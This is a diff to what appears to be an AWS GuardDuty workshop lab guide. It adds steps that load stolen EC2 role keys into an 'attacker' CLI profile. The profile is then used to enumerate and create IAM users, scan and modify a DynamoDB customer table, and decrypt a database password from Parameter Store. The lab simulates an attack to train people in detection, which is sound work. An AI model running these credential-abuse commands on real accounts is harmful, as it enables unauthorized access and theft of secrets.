@@ -58,44 +58,55 @@ To simulate this last and final attack you will need to retrieve the IAM tempora
 
 5. Make note of the **AccessKeyID**, **SecretAccessKey**, and **Token**.
 
+**Lets use the keys and run some queries**
+
+Nagivate to Cloud9 and launch the IDE as you've done in Lab2 and lets update the AWS keys and use the ones associated with the ec2 Role.
+
+Replace <access_key>, <secret_key> and <session_token> with the values you captured from Session Manager and run the following commands
+
+     
+     aws configure set profile.attacker.region ap-southeast-1
+     aws configure set profile.attacker.aws_access_key_id <access_key> 
+     aws configure set profile.attacker.aws_secret_access_key <secret_key> 
+     aws configure set profile.attacker.aws_session_token <session_token>
+     
 
 **Do you have any IAM permissions:**
 
-Nagivate to Cloud9 and launch the IDE as you've done in Lab2 and run the following commands.
-
 ```
-aws iam list-users
+aws iam list-users --profile attacker
 
-aws iam create-user --user-name Chuck
+aws iam create-user --user-name Chuck --profile attacker
 ```
 
 **What about DynamoDB?**
 ```
-aws dynamodb list-tables
+aws dynamodb list-tables --profile attacker
 
-aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB
+aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile attacker
 ```
 
 **Can you query the data?**
 ```
-aws dynamodb scan --table-name GuardDuty-Example-Customer-DB
+aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile attacker
 
-aws dynamodb put-item --table-name GuardDuty-Example-Customer-DB --item '{"name":{"S":"Joshua Tree"},"state":{"S":"Michigan"},"website":{"S":"https://www.nps.gov/yell/index.htm"}}'
+aws dynamodb put-item --table-name GuardDuty-Example-Customer-DB --item '{"name":{"S":"Joshua Tree"},"state":{"S":"Michigan"},"website":{"S":"https://www.nps.gov/yell/index.htm"}}' --profile attacker
 
-aws dynamodb scan --table-name GuardDuty-Example-Customer-DB
+aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile attacker
 
-aws dynamodb list-tables
+aws dynamodb list-tables --profile attacker
 ```
 
 **Do you have access to Systems Manager Parameter Store?**
 ```
-aws ssm describe-parameters
+aws ssm describe-parameters --profile attacker
 
-aws ssm get-parameters --names "gd_prod_dbpwd_sample"
+aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile attacker
 
-aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption
+aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile attacker
 
 ```
+
 ## Proceed to Scenario 1:
 
 [Scenario 1](https://github.com/securityroadshow/amazon-guardduty-hands-on/blob/master/docs/scenario1/index.md)
